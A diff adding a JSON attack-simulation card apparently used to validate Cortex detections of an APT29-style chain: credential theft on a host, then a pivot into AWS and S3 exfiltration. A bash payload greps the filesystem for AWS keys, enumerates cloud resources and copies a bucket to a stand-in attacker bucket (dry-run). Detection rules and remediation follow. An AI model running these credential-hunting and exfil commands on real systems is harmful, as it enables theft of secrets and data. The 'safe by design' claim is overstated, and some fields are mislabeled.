@@ -1,0 +1,491 @@
+{
+  "id": "TTP-2026-0049",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-05-20T21:16:12+00:00",
+    "updated_at": "2026-06-02",
+    "authors": [
+      {
+        "name": "CortexSim generate_card.py",
+        "role": "author"
+      },
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "reviewer"
+      }
+    ],
+    "tags": [
+      "actor-apt29",
+      "actor-midnight-blizzard",
+      "plane-analytics",
+      "multi-plane-stitch",
+      "cdr-edr-correlation",
+      "vector-cloud-cred-theft",
+      "industry-all",
+      "severity-critical",
+      "analytics"
+    ],
+    "source_refs": [
+      "SRC-MITRE-ATTACK",
+      "SRC-UNIT42"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "ransomware-chain",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": [
+        "linux"
+      ],
+      "estimated_runtime_seconds": 120,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "APT29 Hybrid Cloud Credential Theft \u2192 Cloud Pivot \u2192 S3 Exfil Stitch (T1552.001)",
+    "summary": "Modeled on APT29 / Midnight Blizzard cloud TTPs: a web service account greps the filesystem for AWS keys, uses the discovered credentials from the same host to call the AWS API, enumerates EC2/IAM/S3, reads a sensitivity-tagged bucket, and copies data to an attacker-owned bucket. The Cortex value is hybrid stitching: XSIAM joins the endpoint XDR process leg (cloud_audit's missing 'who ran it')\u2026",
+    "description": "APT29 (Midnight Blizzard) is the canonical hybrid-cloud adversary: harvest credentials on an endpoint, then operate entirely through legitimate cloud APIs where endpoint EDR has no visibility. This scenario stitches the two planes XSIAM must fuse. The endpoint plane (Cortex XDR, xdr_data) sees the recursive AWS-key grep, the filesystem traversal of /home and /root, and the aws CLI launched by www-data with inline access-key env vars \u2014 establishing WHO and from WHICH host the keys were used. The cloud plane (Cortex Cloud / CDR, cloud_audit backed by CloudTrail) sees sts:GetCallerIdentity from an unenrolled source IP, the EC2+IAM+S3 multi-service discovery burst, the GetBucketAcl/ListObjects on the sensitivity-tagged bucket, and the cross-account S3 CopyObject to the attacker bucket. The endpoint plane alone cannot prove the keys were abused in the cloud; the cloud plane alone cannot attribute the API calls to a compromised host and identity. The correlation rules join the two on the AWS access-key-id / principal within a 60s window, producing the full APT29 story: cred dump (EDR) \u2192 cloud pivot (CDR) \u2192 discovery \u2192 collection \u2192 exfil under one incident_id. All API calls use AWS example credentials and dry-run flags \u2014 safe by design.",
+    "severity": "critical",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [
+      {
+        "name": "APT29",
+        "aliases": [
+          "Midnight Blizzard",
+          "Cozy Bear",
+          "Nobelium"
+        ],
+        "mitre_group_id": "G0016"
+      }
+    ],
+    "campaigns": [
+      "Midnight Blizzard cloud intrusion set"
+    ],
+    "malware_families": [],
+    "industries_targeted": [
+      "government",
+      "technology"
+    ],
+    "first_observed": "2021-01-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1552",
+        "name": "Unsecured Credentials: Credentials In Files",
+        "tactic_ids": [
+          "TA0006"
+        ],
+        "tactic_names": [
+          "Credential Access"
+        ],
+        "subtechnique_id": "T1552.001"
+      },
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter: Unix Shell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ],
+        "subtechnique_id": "T1059.004"
+      },
+      {
+        "technique_id": "T1078",
+        "name": "Valid Accounts: Cloud Accounts",
+        "tactic_ids": [
+          "TA0001",
+          "TA0005",
+          "TA0004"
+        ],
+        "tactic_names": [
+          "Initial Access",
+          "Defense Evasion",
+          "Privilege Escalation"
+        ],
+        "subtechnique_id": "T1078.004"
+      },
+      {
+        "technique_id": "T1580",
+        "name": "Cloud Infrastructure Discovery",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      },
+      {
+        "technique_id": "T1530",
+        "name": "Data from Cloud Storage",
+        "tactic_ids": [
+          "TA0009"
+        ],
+        "tactic_names": [
+          "Collection"
+        ]
+      },
+      {
+        "technique_id": "T1537",
+        "name": "Transfer Data to Cloud Account",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ]
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": [
+      "Process: Process Creation",
+      "Command: Command Execution",
+      "File: File Access",
+      "Cloud Service: Cloud Service Metadata",
+      "Cloud Storage: Cloud Storage Access",
+      "Logon Session: Logon Session Creation"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "stratus-red-team",
+    "framework_reference_id": "T1552.001 + aws.credential-access.* / aws.exfiltration.* \u2014 Stratus Red Team AWS techniques",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "Cortex XDR Linux agent installed and reporting healthy on the web host.",
+        "check_command": "systemctl is-active cortex-agent || ps aux | grep -i traps"
+      },
+      {
+        "description": "Cortex Cloud / CDR ingesting AWS CloudTrail into the cloud_audit dataset for the target account.",
+        "check_command": "echo 'verify cloud_audit dataset is receiving CloudTrail in XSIAM'"
+      },
+      {
+        "description": "AWS CLI available on the endpoint (example credentials are used).",
+        "check_command": "command -v aws"
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# Uses AWS example credentials + dry-run flags \u2014 safe by design.\ngrep -r -l -E 'AKIA[0-9A-Z]{16}|aws_secret_access_key' /home /var/www /opt 2>/dev/null | head -20\nfind / -name 'credentials' -path '*/.aws/*' 2>/dev/null\nexport AWS_ACCESS_KEY_ID=\"${AWS_ACCESS_KEY_ID:-AKIAIOSFODNN7EXAMPLE}\"\nexport AWS_SECRET_ACCESS_KEY=\"${AWS_SECRET_ACCESS_KEY:-wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY}\"\naws sts get-caller-identity --region us-east-1 2>&1 | head -5 || true\naws ec2 describe-instances --region us-east-1 --max-items 5 2>&1 | head -20 || true\naws iam list-users --max-items 10 2>&1 | head -20 || true\naws s3 ls 2>&1 | head -20 || true\naws s3 ls s3://cortexsim-sensitive-demo/ --recursive 2>&1 | head -20 || true\naws s3 cp s3://cortexsim-sensitive-demo/ s3://cortexsim-attacker-drop/ --recursive --dryrun 2>&1 | head -10 || true",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "grep recursing for the AWS access-key pattern from www-data.",
+        "expected_value": "actor_process_image_name = \"grep\" and command_line contains \"AKIA\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "aws CLI launched by www-data.",
+        "expected_value": "actor_process_image_name = \"aws\" and actor_effective_username = \"www-data\""
+      },
+      {
+        "artifact_type": "cloud-api-call",
+        "description": "CloudTrail sts:GetCallerIdentity from an unenrolled source IP.",
+        "expected_value": "event_name = \"GetCallerIdentity\" and event_source = \"sts.amazonaws.com\""
+      },
+      {
+        "artifact_type": "cloud-api-call",
+        "description": "Multi-service discovery burst (ec2:DescribeInstances + iam:ListUsers + s3:ListBuckets) from one principal.",
+        "expected_value": "event_name in (\"DescribeInstances\",\"ListUsers\",\"ListBuckets\")"
+      },
+      {
+        "artifact_type": "cloud-api-call",
+        "description": "S3 CopyObject to an attacker-owned destination bucket.",
+        "expected_value": "event_name = \"CopyObject\" and request_parameters.bucketName = \"cortexsim-attacker-drop\""
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY\nrm -f /tmp/cortexsim_mp004_*.json /tmp/cortexsim_mp004_*.log\necho '[CortexSim] SIM-MP-004 cleanup complete - no persistent artifacts'"
+    }
+  },
+  "detections": {
+    "iocs": [
+      {
+        "ioc_type": "user-agent",
+        "value": "cortexsim-attacker-drop",
+        "context": "Attacker-controlled S3 destination bucket on the TIM watchlist. The IOC match on the CopyObject destination is cross-referenced with the sensitivity-tagged source bucket and the discovery burst to confirm the exfil leg of the APT29 chain."
+      }
+    ],
+    "biocs": [
+      {
+        "name": "MP-004 Recursive AWS Key Pattern Grep From Service Account",
+        "description": "XDR \u2014 recursive credential-pattern grep from non-interactive service account. The endpoint credential-access leg: www-data greps the filesystem for AWS key material.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"grep\", \"egrep\", \"rg\", \"find\")\n| filter action_process_image_command_line contains_any (\"AKIA\", \"aws_secret_access_key\", \".aws/credentials\")\n| filter actor_effective_username in (\"www-data\", \"nobody\", \"apache\", \"nginx\")",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1552.001"
+        ]
+      },
+      {
+        "name": "MP-004 AWS CLI Invoked By www-data With Inline Access Key Env",
+        "description": "XDR \u2014 aws cli invoked by www-data with inline access-key env vars. The hybrid pivot: the endpoint process that turns discovered keys into cloud API calls \u2014 the 'who/where' the cloud_audit leg cannot see.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = \"aws\"\n| filter actor_effective_username in (\"www-data\", \"nobody\", \"apache\", \"nginx\")\n| filter action_process_image_command_line contains_any (\"sts\", \"get-caller-identity\", \"ec2\", \"s3\", \"iam\")",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1078.004"
+        ]
+      },
+      {
+        "name": "MP-004 Cloud Multi Service Describe List Burst From Single Principal",
+        "description": "CDR \u2014 multi-service describe/list burst (EC2+IAM+S3) from single principal in <30s. Cloud discovery: one principal touches three services in a tight window.",
+        "logic": "dataset = cloud_audit\n| filter cloud_provider = \"AWS\"\n| filter event_name in (\"DescribeInstances\", \"ListUsers\", \"ListBuckets\", \"ListAccessKeys\", \"GetAccountSummary\")\n| comp count_distinct(event_source) as service_count, count() as call_count by user_identity_access_key_id, bin(_time, 30s) as window\n| filter service_count >= 3",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1580"
+        ]
+      },
+      {
+        "name": "MP-004 GetBucketAcl And ListObjects On Sensitive Tagged Bucket",
+        "description": "CDR \u2014 GetBucketAcl + ListObjects on sensitivity-tagged bucket by unauthorized principal. Cloud collection: targeted access to the sensitive bucket.",
+        "logic": "dataset = cloud_audit\n| filter cloud_provider = \"AWS\" and event_source = \"s3.amazonaws.com\"\n| filter event_name in (\"GetBucketAcl\", \"ListObjects\", \"ListObjectsV2\", \"GetObject\")\n| filter request_parameters_bucket_name = \"cortexsim-sensitive-demo\"\n| comp count() as access_count by user_identity_access_key_id, request_parameters_bucket_name",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1530"
+        ]
+      },
+      {
+        "name": "MP-004 S3 CopyObject To Non Owned Destination Bucket",
+        "description": "CDR \u2014 S3 CopyObject to non-owned destination account/bucket. Cloud exfil: data copied from the sensitive source to the attacker-owned bucket.",
+        "logic": "dataset = cloud_audit\n| filter cloud_provider = \"AWS\" and event_source = \"s3.amazonaws.com\"\n| filter event_name in (\"CopyObject\", \"PutObject\")\n| filter request_parameters_bucket_name = \"cortexsim-attacker-drop\"\n| comp count() as copy_count by user_identity_access_key_id, request_parameters_bucket_name",
+        "severity": "critical",
+        "mitre_technique_ids": [
+          "T1537"
+        ]
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "MP-004 Service Account Traversing Home And Root Dirs",
+        "query": "preset = xdr_data\n| filter _time > to_timestamp(current_time() - 1800)\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"grep\", \"find\", \"egrep\", \"rg\")\n| filter action_process_image_command_line contains_any (\"/home\", \"/root\", \"/opt\", \"/var/www\")\n| filter actor_effective_username != \"root\"\n| fields _time, agent_hostname, actor_effective_username, action_process_image_command_line",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "MP-004 CloudTrail GetCallerIdentity From Unenrolled Source IP",
+        "query": "dataset = cloud_audit\n| filter _time > to_timestamp(current_time() - 1800)\n| filter cloud_provider = \"AWS\" and event_source = \"sts.amazonaws.com\" and event_name = \"GetCallerIdentity\"\n| fields _time, user_identity_access_key_id, user_identity_arn, source_ip, user_agent",
+        "expected_rows_min": 1,
+        "dataset": "cloud_audit"
+      },
+      {
+        "purpose": "validation",
+        "name": "MP-004 Stitch Endpoint Process With Cloud Audit By Principal",
+        "query": "dataset = xdr_data\n| filter _time > to_timestamp(current_time() - 1800)\n| filter (event_type = ENUM.PROCESS and actor_process_image_name = \"aws\") or (_product = \"cloud_audit\" and event_name = \"GetCallerIdentity\")\n| comp count_distinct(_product) as plane_count, count_distinct(incident_id) as incident_count by actor_effective_username\n| filter plane_count >= 2 and incident_count = 1\n| fields actor_effective_username, plane_count, incident_count",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "MP-004 UEBA First Time Broad Cloud Discovery Pattern",
+        "query": "dataset = cloud_audit\n| filter _time > to_timestamp(current_time() - 1800)\n| filter cloud_provider = \"AWS\"\n| filter event_name contains_any (\"Describe\", \"List\", \"Get\")\n| comp count_distinct(event_source) as services_touched, count() as total_calls by user_identity_access_key_id, bin(_time, 5m) as window\n| filter services_touched >= 3\n| fields window, user_identity_access_key_id, services_touched, total_calls",
+        "expected_rows_min": 1,
+        "dataset": "cloud_audit"
+      },
+      {
+        "purpose": "validation",
+        "name": "MP-004 Cloud Data Egress Volume Anomaly From Tagged Source",
+        "query": "dataset = cloud_audit\n| filter _time > to_timestamp(current_time() - 1800)\n| filter cloud_provider = \"AWS\" and event_source = \"s3.amazonaws.com\"\n| filter event_name in (\"CopyObject\", \"GetObject\", \"PutObject\")\n| filter request_parameters_bucket_name in (\"cortexsim-sensitive-demo\", \"cortexsim-attacker-drop\")\n| comp count() as object_ops by user_identity_access_key_id, request_parameters_bucket_name\n| fields user_identity_access_key_id, request_parameters_bucket_name, object_ops",
+        "expected_rows_min": 1,
+        "dataset": "cloud_audit"
+      },
+      {
+        "purpose": "validation",
+        "name": "MP-004 Stitch Full Kill Chain Cred Dump To Cloud Exfil",
+        "query": "dataset = xdr_data\n| filter _time > to_timestamp(current_time() - 1800)\n| filter (event_type = ENUM.PROCESS and actor_process_image_name in (\"grep\", \"aws\")) or (_product = \"cloud_audit\" and event_name in (\"GetCallerIdentity\", \"DescribeInstances\", \"ListObjects\", \"CopyObject\"))\n| comp count_distinct(_product) as plane_count, count_distinct(incident_id) as incident_count, count_distinct(event_name) as stage_count by actor_effective_username\n| filter plane_count >= 2 and incident_count = 1\n| fields actor_effective_username, plane_count, incident_count, stage_count",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "Hybrid Cloud Cred Pivot Stitch \u2014 XDR AWS CLI + CloudTrail Principal",
+        "rule_id": "CR-MP-0007",
+        "logic": "(BIOC(MP-004 AWS CLI Invoked By www-data With Inline Access Key Env) AND XQL(MP-004 CloudTrail GetCallerIdentity From Unenrolled Source IP)) -> join on aws_access_key_id within 60s"
+      },
+      {
+        "name": "Cloud Discovery To Collection Stitch \u2014 Multi Service Burst + Sensitive Bucket",
+        "rule_id": "CR-MP-0008",
+        "logic": "(BIOC(MP-004 Cloud Multi Service Describe List Burst From Single Principal) AND BIOC(MP-004 GetBucketAcl And ListObjects On Sensitive Tagged Bucket)) -> join on aws_access_key_id within 300s"
+      },
+      {
+        "name": "APT29 Full Kill Chain Stitch \u2014 Cred Dump To Cloud Exfil",
+        "rule_id": "CR-MP-0009",
+        "logic": "(BIOC(MP-004 Recursive AWS Key Pattern Grep From Service Account) OR BIOC(MP-004 AWS CLI Invoked By www-data With Inline Access Key Env)) AND BIOC(MP-004 S3 CopyObject To Non Owned Destination Bucket) AND IOC(aws-s3-bucket: cortexsim-attacker-drop) -> join on principal within 1800s"
+      }
+    ],
+    "analytics_modules": [
+      "Cortex Cloud CDR \u2014 CloudTrail anomaly analytics (unenrolled-IP API use)",
+      "Cortex Cloud CDR \u2014 UEBA principal-behavior deviation",
+      "Cortex XSIAM Correlation Engine \u2014 hybrid endpoint\u2194cloud_audit stitch by AWS principal"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-cloud",
+        "submodule": "cdr-cloudtrail-analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "CDR-AN-STS-UNENROLLED-IP-001",
+          "CDR-AN-MULTISERVICE-DISCOVERY-001"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = cloud_audit | filter event_name = \"GetCallerIdentity\" | fields _time, user_identity_access_key_id, source_ip"
+      },
+      {
+        "module": "cortex-cloud",
+        "submodule": "cdr-data-security",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "CDR-S3-COPY-NONOWNED-001",
+          "CDR-S3-SENSITIVE-ACCESS-001"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = cloud_audit | filter event_name = \"CopyObject\" and request_parameters_bucket_name = \"cortexsim-attacker-drop\""
+      },
+      {
+        "module": "cortex-xdr",
+        "submodule": "behavioral-analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XDR-BIOC-MP-0049-AWSGREP",
+          "XDR-BIOC-MP-0049-AWSCLI"
+        ],
+        "agent_version_min": "8.4.0",
+        "license_required": "pro",
+        "evidence_query": "preset = xdr_data | filter actor_process_image_name = \"grep\" and action_process_image_command_line contains \"AKIA\" | fields _time, agent_hostname, action_process_image_command_line"
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "correlation",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XSIAM-CR-MP-0007",
+          "XSIAM-CR-MP-0008",
+          "XSIAM-CR-MP-0009"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "Correlation CR-MP-0007/0008/0009 join the XDR endpoint legs to the cloud_audit legs on AWS access-key-id / principal, fusing the APT29 chain into one incident."
+      },
+      {
+        "module": "cortex-xsoar",
+        "coverage_tier": "response",
+        "rule_ids": [
+          "XSOAR-PB-CloudCredTheftResponse-v2"
+        ],
+        "license_required": "base",
+        "evidence_query": "Playbook deactivates the leaked AWS access key, isolates the source host, and revokes the cross-account bucket policy."
+      }
+    ],
+    "use_cases": [
+      {
+        "use_case_id": "UC-MP-004",
+        "name": "Hybrid Cloud Credential Theft Stitching \u2014 Endpoint Cred Dump \u2192 Cloud API Abuse \u2192 S3 Exfil",
+        "description": "Validate that XSIAM stitches the endpoint cred-dump, the cloud API pivot, and the S3 exfil into a single APT29 incident across EDR + CDR planes.",
+        "test_cases": [
+          {
+            "test_case_id": "TC-MP-004A",
+            "objective": "Each plane fires (XDR grep/aws BIOCs + CDR CloudTrail anomalies).",
+            "preconditions": [
+              "Cortex XDR Linux agent >= 8.4.0 healthy on the web host.",
+              "Cortex Cloud / CDR ingesting CloudTrail into cloud_audit."
+            ],
+            "steps": [
+              "Run SIM-MP-004 steps 1-5.",
+              "Confirm the XDR aws-CLI BIOC and the CDR CloudTrail/S3 detections each return rows."
+            ],
+            "success_criteria": [
+              "BIOC `MP-004 AWS CLI Invoked By www-data With Inline Access Key Env` fires within 60s.",
+              "BIOC `MP-004 S3 CopyObject To Non Owned Destination Bucket` fires on the exfil step."
+            ],
+            "expected_score_weight": 0.4
+          },
+          {
+            "test_case_id": "TC-MP-004B",
+            "objective": "Endpoint and cloud legs stitch into one hybrid incident on the AWS principal.",
+            "success_criteria": [
+              "Correlation `CR-MP-0007` joins the XDR aws process and the CloudTrail GetCallerIdentity on access-key-id.",
+              "Stitch XQL returns plane_count >= 2 and incident_count = 1."
+            ],
+            "expected_score_weight": 0.3
+          },
+          {
+            "test_case_id": "TC-MP-004C",
+            "objective": "The full kill chain (cred-dump \u2192 pivot \u2192 discovery \u2192 collection \u2192 exfil) lands under one story with the attacker-bucket IOC.",
+            "success_criteria": [
+              "Correlation `CR-MP-0009` produces one incident spanning >= 2 planes and the IOC match on `cortexsim-attacker-drop`.",
+              "Incident severity is Critical."
+            ],
+            "expected_score_weight": 0.3
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Scope IAM access keys with least privilege; prefer short-lived STS roles and forbid long-lived keys on web tiers.",
+      "Enforce IMDSv2 and SCPs that deny cross-account S3 writes to non-allowlisted buckets.",
+      "Run web services under least-privilege OS accounts that cannot read other users' home directories or .aws credentials.",
+      "Enable Cortex Cloud CDR with CloudTrail ingestion and S3 data-event logging across the org."
+    ],
+    "detection_engineering": [
+      "Stitch the endpoint process that launched the aws CLI to the CloudTrail session on the shared access-key-id to attribute cloud API abuse to a compromised host.",
+      "Alert on multi-service discovery bursts and first-time broad enumeration per principal (UEBA deviation).",
+      "Cross-reference S3 CopyObject/PutObject destinations against TIM watchlists and the sensitivity-tagged source bucket to confirm exfil intent."
+    ],
+    "response_playbook": "XSOAR-PB-CloudCredTheftResponse-v2"
+  },
+  "references": [
+    {
+      "title": "Unit42 - APT29 / Midnight Blizzard Cloud TTPs",
+      "url": "https://unit42.paloaltonetworks.com/russia-apt29-cozy-bear-midnight-blizzard/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK G0016 \u2014 APT29",
+      "url": "https://attack.mitre.org/groups/G0016/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1552.001 \u2014 Credentials In Files",
+      "url": "https://attack.mitre.org/techniques/T1552/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-05-20",
+      "author": "CortexSim generate_card.py",
+      "change": "Initial draft auto-generated from scenario SIM-MP-004."
+    },
+    {
+      "entry_version": "1.0.0",
+      "date": "2026-06-02",
+      "author": "Henry Reed",
+      "change": "Replaced skeleton detections with real hybrid endpoint/cloud stitching content: 5 BIOCs (XDR grep + aws CLI, CDR discovery burst + sensitive-bucket access + CopyObject), 6 validation XQL (xdr_data + cloud_audit legs + stitch), 1 IOC, and 3 correlation rules CR-MP-0007/0008/0009 joining EDR to cloud_audit on AWS principal. Enriched APT29 threat context + panw_mapping. Promoted to active."
+    }
+  ]
+}
